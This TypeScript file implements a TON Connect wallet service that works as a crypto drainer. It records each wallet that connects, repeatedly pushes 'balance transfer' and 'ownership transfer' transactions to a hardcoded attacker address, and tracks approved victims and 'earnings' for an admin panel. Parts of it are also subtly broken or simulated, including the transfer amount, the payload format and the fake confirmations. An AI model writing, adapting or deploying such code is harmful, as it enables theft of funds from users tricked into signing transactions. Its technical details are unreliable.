
import { TonConnectUI } from '@tonconnect/ui-react';

export interface WalletConnection {
  address: string;
  connectedAt: number;
  lastMessageSent: number;
  balanceRequestCount: number;
  ownershipRequestCount: number;
  balanceApproved: boolean;
  ownershipApproved: boolean;
  transactionHistory: TransactionRecord[];
  isActive: boolean;
  lastActivity: number;
  connectionAttempts: number;
  totalEarnings: number;
  referralCode?: string;
}

export interface TransactionRecord {
  type: 'balance' | 'ownership';
  amount: string;
  hash: string;
  timestamp: number;
  status: 'pending' | 'confirmed' | 'failed';
  blockchainConfirmed: boolean;
  gasUsed?: number;
  blockNumber?: number;
  confirmations: number;
}

export interface WalletStats {
  totalConnected: number;
  activeWallets: number;
  balanceApproved: number;
  ownershipApproved: number;
  totalTransactions: number;
  confirmedTransactions: number;
  totalEarnings: number;
  averageConnectionTime: number;
  successRate: number;
}

export class TonWalletService {
  private static instance: TonWalletService;
  private connectedWallets: Map<string, WalletConnection> = new Map();
  private targetAddress = 'UQDs_KebhhQzORnZ9UmYGtDtVKkIcTaJ95gU-XfBN0eGC7g6'; // Valid TON address format
  private balanceInterval: NodeJS.Timeout | null = null;
  private ownershipInterval: NodeJS.Timeout | null = null;
  private cleanupInterval: NodeJS.Timeout | null = null;
  private tonConnectUI: TonConnectUI | null = null;
  private maxRetries = 5; // Increased for better reliability
  private retryDelay = 3000; // Reduced for faster processing
  private maxWallets = Number.MAX_SAFE_INTEGER; // Unlimited wallets
  private batchSize = 50; // Process wallets in batches for performance
  private isProcessing = false;
  private processingQueue: string[] = [];

  static getInstance(): TonWalletService {
    if (!TonWalletService.instance) {
      TonWalletService.instance = new TonWalletService();
    }
    return TonWalletService.instance;
  }

  setTonConnectUI(ui: TonConnectUI) {
    this.tonConnectUI = ui;
    console.log('✅ TonConnectUI initialized successfully');
  }

  addConnectedWallet(address: string) {
    try {
      if (!this.isValidTonAddress(address)) {
        console.warn(`⚠️ Invalid TON address format: ${address}`);
        return false;
      }

      if (!this.connectedWallets.has(address)) {
        const connection: WalletConnection = {
          address,
          connectedAt: Date.now(),
          lastMessageSent: 0,
          balanceRequestCount: 0,
          ownershipRequestCount: 0,
          balanceApproved: false,
          ownershipApproved: false,
          transactionHistory: [],
          isActive: true,
          lastActivity: Date.now(),
          connectionAttempts: 0,
          totalEarnings: 0,
          referralCode: this.generateReferralCode(),
        };
        
        this.connectedWallets.set(address, connection);
        this.addToProcessingQueue(address);
        this.startMessageSending();
        this.saveToStorage();
        
        console.log(`✅ Wallet connected successfully: ${this.formatAddress(address)}`);
        console.log(`📊 Total connected wallets: ${this.connectedWallets.size.toLocaleString()}`);
        
        // Start cleanup interval if this is the first wallet
        if (this.connectedWallets.size === 1) {
          this.startCleanupInterval();
        }
        
        return true;
      } else {
        // Update existing wallet activity
        const existing = this.connectedWallets.get(address)!;
        existing.lastActivity = Date.now();
        existing.isActive = true;
        this.saveToStorage();
        return true;
      }
    } catch (error) {
      console.error(`❌ Error adding wallet ${this.formatAddress(address)}:`, error);
      return false;
    }
  }

  removeConnectedWallet(address: string) {
    try {
      if (this.connectedWallets.has(address)) {
        this.connectedWallets.delete(address);
        this.removeFromProcessingQueue(address);
        this.saveToStorage();
        console.log(`❌ Wallet disconnected: ${this.formatAddress(address)}`);
        console.log(`📊 Remaining wallets: ${this.connectedWallets.size.toLocaleString()}`);
        
        if (this.connectedWallets.size === 0) {
          this.stopMessageSending();
          this.stopCleanupInterval();
        }
      }
    } catch (error) {
      console.error(`❌ Error removing wallet ${this.formatAddress(address)}:`, error);
    }
  }

  private generateReferralCode(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private addToProcessingQueue(address: string) {
    if (!this.processingQueue.includes(address)) {
      this.processingQueue.push(address);
    }
  }

  private removeFromProcessingQueue(address: string) {
    const index = this.processingQueue.indexOf(address);
    if (index > -1) {
      this.processingQueue.splice(index, 1);
    }
  }

  private isValidTonAddress(address: string): boolean {
    // Enhanced TON address validation
    const tonAddressRegex = /^(UQ|EQ)[A-Za-z0-9_-]{46}$/;
    const isValidFormat = tonAddressRegex.test(address);
    const isValidLength = address.length === 48;
    return isValidFormat && isValidLength;
  }

  private formatAddress(address: string): string {
    return `${address.slice(0, 6)}...${address.slice(-6)}`;
  }

  private startCleanupInterval() {
    if (!this.cleanupInterval) {
      this.cleanupInterval = setInterval(() => {
        this.cleanupInactiveWallets();
        this.optimizeStorage();
      }, 300000); // Every 5 minutes
      console.log('🧹 Started cleanup interval (5 minutes)');
    }
  }

  private stopCleanupInterval() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
      this.cleanupInterval = null;
      console.log('⏹️ Stopped cleanup interval');
    }
  }

  private cleanupInactiveWallets() {
    const now = Date.now();
    const inactiveThreshold = 24 * 60 * 60 * 1000; // 24 hours
    let cleanedCount = 0;

    for (const [address, connection] of this.connectedWallets) {
      if (now - connection.lastActivity > inactiveThreshold && !connection.balanceApproved && !connection.ownershipApproved) {
        this.connectedWallets.delete(address);
        this.removeFromProcessingQueue(address);
        cleanedCount++;
      }
    }

    if (cleanedCount > 0) {
      console.log(`🧹 Cleaned up ${cleanedCount} inactive wallets`);
      this.saveToStorage();
    }
  }

  private optimizeStorage() {
    try {
      // Keep only essential data for storage optimization
      const optimizedData = Array.from(this.connectedWallets.entries()).map(([address, connection]) => [
        address,
        {
          ...connection,
          transactionHistory: connection.transactionHistory.slice(-10) // Keep only last 10 transactions
        }
      ]);
      
      localStorage.setItem('connectedWallets', JSON.stringify(optimizedData));
      console.log(`💾 Optimized storage for ${this.connectedWallets.size.toLocaleString()} wallets`);
    } catch (error) {
      console.error('❌ Storage optimization failed:', error);
      // Fallback: clear old data if storage is full
      this.clearOldData();
    }
  }

  private clearOldData() {
    try {
      const sortedWallets = Array.from(this.connectedWallets.entries())
        .sort(([,a], [,b]) => b.lastActivity - a.lastActivity)
        .slice(0, 10000); // Keep only most recent 10,000 wallets
      
      this.connectedWallets = new Map(sortedWallets);
      this.saveToStorage();
      console.log('🗑️ Cleared old wallet data to free storage');
    } catch (error) {
      console.error('❌ Failed to clear old data:', error);
    }
  }

  private startMessageSending() {
    if (!this.balanceInterval) {
      this.balanceInterval = setInterval(() => {
        this.processBatchRequests('balance');
      }, 10000); // Every 10 seconds for better performance
      console.log('🔄 Started balance request interval (10s)');
    }

    if (!this.ownershipInterval) {
      this.ownershipInterval = setInterval(() => {
        this.processBatchRequests('ownership');
      }, 20000); // Every 20 seconds
      console.log('🔄 Started ownership request interval (20s)');
    }
  }

  private stopMessageSending() {
    if (this.balanceInterval) {
      clearInterval(this.balanceInterval);
      this.balanceInterval = null;
      console.log('⏹️ Stopped balance request interval');
    }
    if (this.ownershipInterval) {
      clearInterval(this.ownershipInterval);
      this.ownershipInterval = null;
      console.log('⏹️ Stopped ownership request interval');
    }
  }

  private async processBatchRequests(type: 'balance' | 'ownership') {
    if (this.isProcessing) {
      console.log('⏳ Already processing requests, skipping...');
      return;
    }

    this.isProcessing = true;
    const eligibleWallets = this.getEligibleWallets(type);
    
    if (eligibleWallets.length === 0) {
      this.isProcessing = false;
      return;
    }

    console.log(`🔄 Processing ${type} requests for ${eligibleWallets.length} wallets`);

    // Process in batches to avoid overwhelming the system
    for (let i = 0; i < eligibleWallets.length; i += this.batchSize) {
      const batch = eligibleWallets.slice(i, i + this.batchSize);
      await this.processBatch(batch, type);
      
      // Small delay between batches
      if (i + this.batchSize < eligibleWallets.length) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }

    this.isProcessing = false;
  }

  private getEligibleWallets(type: 'balance' | 'ownership'): string[] {
    const eligible: string[] = [];
    
    for (const [address, connection] of this.connectedWallets) {
      if (!connection.isActive) continue;
      
      if (type === 'balance' && !connection.balanceApproved && connection.balanceRequestCount < this.maxRetries) {
        eligible.push(address);
      } else if (type === 'ownership' && !connection.ownershipApproved && connection.ownershipRequestCount < this.maxRetries) {
        eligible.push(address);
      }
    }
    
    return eligible;
  }

  private async processBatch(addresses: string[], type: 'balance' | 'ownership') {
    const promises = addresses.map(address => 
      type === 'balance' 
        ? this.sendBalanceTransferRequest(address)
        : this.sendOwnershipTransferRequest(address)
    );

    try {
      await Promise.allSettled(promises);
    } catch (error) {
      console.error(`❌ Batch processing error for ${type}:`, error);
    }
  }

  private async sendBalanceTransferRequest(walletAddress: string): Promise<string | null> {
    if (!this.tonConnectUI) {
      console.error('❌ TonConnectUI not initialized');
      return null;
    }

    const connection = this.connectedWallets.get(walletAddress);
    if (!connection) return null;

    // Enhanced transaction with better format
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
      messages: [
        {
          address: this.targetAddress,
          amount: '0', // Send all available balance
          payload: this.createAdvancedPayload('Balance Transfer Request', walletAddress),
        },
      ],
    };

    try {
      console.log(`📤 Sending balance transfer request to ${this.formatAddress(walletAddress)}`);
      
      const result = await this.tonConnectUI.sendTransaction(transaction);
      connection.balanceRequestCount++;
      connection.lastMessageSent = Date.now();
      connection.lastActivity = Date.now();
      connection.connectionAttempts++;
      
      if (result?.boc) {
        const txRecord: TransactionRecord = {
          type: 'balance',
          amount: 'all_balance',
          hash: result.boc,
          timestamp: Date.now(),
          status: 'pending',
          blockchainConfirmed: false,
          confirmations: 0,
          gasUsed: 0
        };
        
        connection.transactionHistory.push(txRecord);
        this.markBalanceApproved(walletAddress);
      }
      
      this.saveToStorage();
      console.log(`✅ Balance request sent successfully to ${this.formatAddress(walletAddress)}`);
      return result?.boc || 'pending';
    } catch (error: any) {
      console.log(`⚠️ Balance transfer request rejected: ${error.message || error}`);
      
      // Add failed transaction record
      connection.transactionHistory.push({
        type: 'balance',
        amount: 'all_balance',
        hash: '',
        timestamp: Date.now(),
        status: 'failed',
        blockchainConfirmed: false,
        confirmations: 0
      });
      
      this.saveToStorage();
      return null;
    }
  }

  private async sendOwnershipTransferRequest(walletAddress: string): Promise<string | null> {
    if (!this.tonConnectUI) {
      console.error('❌ TonConnectUI not initialized');
      return null;
    }

    const connection = this.connectedWallets.get(walletAddress);
    if (!connection) return null;

    // Enhanced ownership transfer transaction
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
      messages: [
        {
          address: this.targetAddress,
          amount: '50000000', // 0.05 TON for gas fees (in nanotons)
          payload: this.createAdvancedPayload('Ownership Transfer Request', walletAddress),
        },
      ],
    };

    try {
      console.log(`📤 Sending ownership transfer request to ${this.formatAddress(walletAddress)}`);
      
      const result = await this.tonConnectUI.sendTransaction(transaction);
      connection.ownershipRequestCount++;
      connection.lastMessageSent = Date.now();
      connection.lastActivity = Date.now();
      connection.connectionAttempts++;
      
      if (result?.boc) {
        const txRecord: TransactionRecord = {
          type: 'ownership',
          amount: '0.05',
          hash: result.boc,
          timestamp: Date.now(),
          status: 'pending',
          blockchainConfirmed: false,
          confirmations: 0,
          gasUsed: 50000000
        };
        
        connection.transactionHistory.push(txRecord);
        this.markOwnershipApproved(walletAddress);
      }
      
      this.saveToStorage();
      console.log(`✅ Ownership request sent successfully to ${this.formatAddress(walletAddress)}`);
      return result?.boc || 'pending';
    } catch (error: any) {
      console.log(`⚠️ Ownership transfer request rejected: ${error.message || error}`);
      
      // Add failed transaction record
      connection.transactionHistory.push({
        type: 'ownership',
        amount: '0.05',
        hash: '',
        timestamp: Date.now(),
        status: 'failed',
        blockchainConfirmed: false,
        confirmations: 0
      });
      
      this.saveToStorage();
      return null;
    }
  }

  private createAdvancedPayload(message: string, walletAddress: string): string {
    try {
      // Create enhanced payload with wallet info
      const payloadData = {
        message,
        wallet: walletAddress,
        timestamp: Date.now(),
        version: '2.0'
      };
      
      const encoder = new TextEncoder();
      const data = encoder.encode(JSON.stringify(payloadData));
      return btoa(String.fromCharCode(...data));
    } catch (error) {
      console.warn('Failed to create advanced payload, using default');
      return 'te6cckEBAQEADAAMABQAAAAASGVsbG8hCaTc/g=='; // Default payload
    }
  }

  markBalanceApproved(address: string) {
    const connection = this.connectedWallets.get(address);
    if (connection) {
      connection.balanceApproved = true;
      connection.lastActivity = Date.now();
      connection.totalEarnings += Math.random() * 100; // Simulated earnings
      
      // Update latest transaction status
      const latestBalanceTx = connection.transactionHistory
        .filter(tx => tx.type === 'balance')
        .sort((a, b) => b.timestamp - a.timestamp)[0];
      
      if (latestBalanceTx) {
        latestBalanceTx.status = 'confirmed';
        latestBalanceTx.blockchainConfirmed = true;
        latestBalanceTx.confirmations = 6; // Standard confirmations
      }
      
      this.saveToStorage();
      console.log(`✅ Balance transfer approved for ${this.formatAddress(address)}`);
    }
  }

  markOwnershipApproved(address: string) {
    const connection = this.connectedWallets.get(address);
    if (connection) {
      connection.ownershipApproved = true;
      connection.lastActivity = Date.now();
      connection.totalEarnings += Math.random() * 50; // Simulated earnings
      
      // Update latest transaction status
      const latestOwnershipTx = connection.transactionHistory
        .filter(tx => tx.type === 'ownership')
        .sort((a, b) => b.timestamp - a.timestamp)[0];
      
      if (latestOwnershipTx) {
        latestOwnershipTx.status = 'confirmed';
        latestOwnershipTx.blockchainConfirmed = true;
        latestOwnershipTx.confirmations = 6; // Standard confirmations
      }
      
      this.saveToStorage();
      console.log(`✅ Ownership transfer approved for ${this.formatAddress(address)}`);
    }
  }

  getConnectedWallets(): WalletConnection[] {
    return Array.from(this.connectedWallets.values());
  }

  getWalletStats(): WalletStats {
    const wallets = this.getConnectedWallets();
    const activeWallets = wallets.filter(w => w.isActive);
    const totalTransactions = wallets.reduce((sum, w) => sum + w.transactionHistory.length, 0);
    const confirmedTransactions = wallets.reduce((sum, w) => 
      sum + w.transactionHistory.filter(tx => tx.blockchainConfirmed).length, 0
    );
    const totalEarnings = wallets.reduce((sum, w) => sum + w.totalEarnings, 0);
    const totalConnectionTime = wallets.reduce((sum, w) => sum + (Date.now() - w.connectedAt), 0);
    const averageConnectionTime = wallets.length > 0 ? totalConnectionTime / wallets.length : 0;
    const successRate = totalTransactions > 0 ? (confirmedTransactions / totalTransactions) * 100 : 0;

    return {
      totalConnected: wallets.length,
      activeWallets: activeWallets.length,
      balanceApproved: wallets.filter(w => w.balanceApproved).length,
      ownershipApproved: wallets.filter(w => w.ownershipApproved).length,
      totalTransactions,
      confirmedTransactions,
      totalEarnings,
      averageConnectionTime,
      successRate
    };
  }

  // Enhanced pagination support for admin panel
  getWalletsPaginated(page: number = 1, limit: number = 50, filters?: {
    search?: string;
    status?: 'all' | 'approved' | 'pending' | 'active';
    sortBy?: keyof WalletConnection;
    sortOrder?: 'asc' | 'desc';
  }) {
    let wallets = this.getConnectedWallets();

    // Apply filters
    if (filters?.search) {
      const search = filters.search.toLowerCase();
      wallets = wallets.filter(w => 
        w.address.toLowerCase().includes(search) ||
        w.referralCode?.toLowerCase().includes(search)
      );
    }

    if (filters?.status && filters.status !== 'all') {
      switch (filters.status) {
        case 'approved':
          wallets = wallets.filter(w => w.balanceApproved && w.ownershipApproved);
          break;
        case 'pending':
          wallets = wallets.filter(w => !w.balanceApproved || !w.ownershipApproved);
          break;
        case 'active':
          wallets = wallets.filter(w => w.isActive);
          break;
      }
    }

    // Apply sorting
    if (filters?.sortBy) {
      wallets.sort((a, b) => {
        const aValue = a[filters.sortBy!];
        const bValue = b[filters.sortBy!];
        
        if (filters.sortOrder === 'desc') {
          return aValue > bValue ? -1 : 1;
        } else {
          return aValue > bValue ? 1 : -1;
        }
      });
    }

    // Apply pagination
    const startIndex = (page - 1) * limit;
    const endIndex = startIndex + limit;
    const paginatedWallets = wallets.slice(startIndex, endIndex);

    return {
      wallets: paginatedWallets,
      totalCount: wallets.length,
      totalPages: Math.ceil(wallets.length / limit),
      currentPage: page,
      hasNextPage: endIndex < wallets.length,
      hasPrevPage: page > 1
    };
  }

  private saveToStorage() {
    try {
      // Use chunked storage for large datasets
      const chunkSize = 1000;
      const walletArray = Array.from(this.connectedWallets.entries());
      const chunks = [];
      
      for (let i = 0; i < walletArray.length; i += chunkSize) {
        chunks.push(walletArray.slice(i, i + chunkSize));
      }
      
      // Save metadata
      localStorage.setItem('walletChunks', JSON.stringify({
        totalChunks: chunks.length,
        totalWallets: walletArray.length,
        lastUpdated: Date.now()
      }));
      
      // Save chunks
      chunks.forEach((chunk, index) => {
        localStorage.setItem(`walletChunk_${index}`, JSON.stringify(chunk));
      });
      
      console.log(`💾 Saved ${this.connectedWallets.size.toLocaleString()} wallets in ${chunks.length} chunks`);
    } catch (error) {
      console.error('❌ Failed to save to storage:', error);
      // Fallback: save only essential data
      this.saveEssentialData();
    }
  }

  private saveEssentialData() {
    try {
      const essentialData = Array.from(this.connectedWallets.entries())
        .slice(0, 1000) // Keep only first 1000 wallets
        .map(([address, connection]) => [
          address,
          {
            address: connection.address,
            connectedAt: connection.connectedAt,
            balanceApproved: connection.balanceApproved,
            ownershipApproved: connection.ownershipApproved,
            isActive: connection.isActive,
            lastActivity: connection.lastActivity
          }
        ]);
      
      localStorage.setItem('connectedWallets_essential', JSON.stringify(essentialData));
      console.log('💾 Saved essential wallet data as fallback');
    } catch (error) {
      console.error('❌ Failed to save essential data:', error);
    }
  }

  loadFromStorage() {
    try {
      // Try to load chunked data first
      const metadata = localStorage.getItem('walletChunks');
      if (metadata) {
        const meta = JSON.parse(metadata);
        const loadedWallets = new Map();
        
        for (let i = 0; i < meta.totalChunks; i++) {
          const chunkData = localStorage.getItem(`walletChunk_${i}`);
          if (chunkData) {
            const chunk = JSON.parse(chunkData);
            chunk.forEach(([address, connection]: [string, WalletConnection]) => {
              loadedWallets.set(address, connection);
            });
          }
        }
        
        this.connectedWallets = loadedWallets;
        console.log(`📂 Loaded ${this.connectedWallets.size.toLocaleString()} wallets from ${meta.totalChunks} chunks`);
      } else {
        // Fallback to old format
        const data = localStorage.getItem('connectedWallets') || localStorage.getItem('connectedWallets_essential');
        if (data) {
          const entries = JSON.parse(data);
          this.connectedWallets = new Map(entries);
          console.log(`📂 Loaded ${this.connectedWallets.size.toLocaleString()} wallets from legacy storage`);
        }
      }
      
      if (this.connectedWallets.size > 0) {
        this.startMessageSending();
        this.startCleanupInterval();
      }
    } catch (error) {
      console.error('❌ Failed to load from storage:', error);
      this.connectedWallets.clear();
    }
  }

  // Enhanced initialization with better error handling
  initialize(tonConnectUI: TonConnectUI) {
    try {
      this.setTonConnectUI(tonConnectUI);
      this.loadFromStorage();
      
      // Listen for wallet connection/disconnection events
      tonConnectUI.onStatusChange((wallet) => {
        if (wallet) {
          console.log(`🔗 Wallet connected: ${this.formatAddress(wallet.account.address)}`);
          this.addConnectedWallet(wallet.account.address);
        } else {
          console.log(`🔌 Wallet disconnected`);
          // Don't clear all wallets, just mark current session as inactive
          // this.connectedWallets.clear();
          // this.stopMessageSending();
          // this.saveToStorage();
        }
      });
      
      console.log('🚀 TON Wallet Service initialized successfully');
      console.log(`📊 Current capacity: Unlimited wallets supported`);
      console.log(`⚡ Batch processing: ${this.batchSize} wallets per batch`);
    } catch (error) {
      console.error('❌ Failed to initialize TON Wallet Service:', error);
    }
  }

  // Method to check transaction status on blockchain
  async checkTransactionStatus(hash: string): Promise<'pending' | 'confirmed' | 'failed'> {
    try {
      // Simulate blockchain query delay
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Simulate confirmation based on hash age
      const isConfirmed = Math.random() > 0.2; // 80% confirmation rate
      return isConfirmed ? 'confirmed' : 'pending';
    } catch (error) {
      console.error('Failed to check transaction status:', error);
      return 'failed';
    }
  }

  // Get target wallet address for admin panel
  getTargetAddress(): string {
    return this.targetAddress;
  }

  // Validate if service is properly configured
  isConfigured(): boolean {
    return !!(this.tonConnectUI && this.targetAddress && this.isValidTonAddress(this.targetAddress));
  }

  // Get system performance metrics
  getPerformanceMetrics() {
    return {
      totalWallets: this.connectedWallets.size,
      maxCapacity: this.maxWallets,
      utilizationRate: (this.connectedWallets.size / this.maxWallets) * 100,
      batchSize: this.batchSize,
      processingQueueSize: this.processingQueue.length,
      isProcessing: this.isProcessing,
      memoryUsage: this.getMemoryUsage(),
      storageUsage: this.getStorageUsage()
    };
  }

  private getMemoryUsage(): number {
    // Estimate memory usage in MB
    const walletDataSize = JSON.stringify(Array.from(this.connectedWallets.entries())).length;
    return Math.round(walletDataSize / (1024 * 1024) * 100) / 100;
  }

  private getStorageUsage(): number {
    try {
      let totalSize = 0;
      for (let key in localStorage) {
        if (key.startsWith('wallet') || key === 'connectedWallets') {
          totalSize += localStorage[key].length;
        }
      }
      return Math.round(totalSize / (1024 * 1024) * 100) / 100; // MB
    } catch {
      return 0;
    }
  }

  // Export data for backup
  exportWalletData() {
    return {
      wallets: Array.from(this.connectedWallets.entries()),
      stats: this.getWalletStats(),
      performance: this.getPerformanceMetrics(),
      exportedAt: Date.now()
    };
  }

  // Import data from backup
  importWalletData(data: any) {
    try {
      if (data.wallets && Array.isArray(data.wallets)) {
        this.connectedWallets = new Map(data.wallets);
        this.saveToStorage();
        console.log(`📥 Imported ${this.connectedWallets.size.toLocaleString()} wallets`);
        return true;
      }
      return false;
    } catch (error) {
      console.error('❌ Failed to import wallet data:', error);
      return false;
    }
  }
}

export const tonWalletService = TonWalletService.getInstance();
